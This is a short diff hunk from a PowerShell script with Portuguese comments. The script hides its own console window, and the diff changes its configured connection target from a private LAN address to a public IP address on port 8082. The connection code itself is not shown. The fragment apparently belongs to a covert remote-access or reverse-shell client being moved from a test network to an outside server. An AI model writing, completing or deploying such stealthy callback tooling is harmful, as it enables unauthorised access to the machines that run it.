@@ -7,7 +7,7 @@ $hwnd = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($hwnd, 0)
 
 # Configuração
-$ip = "192.168.106.37"
+$ip = "72.44.51.166"
 $port = 8082
 
 $CurrentPath = Get-Location
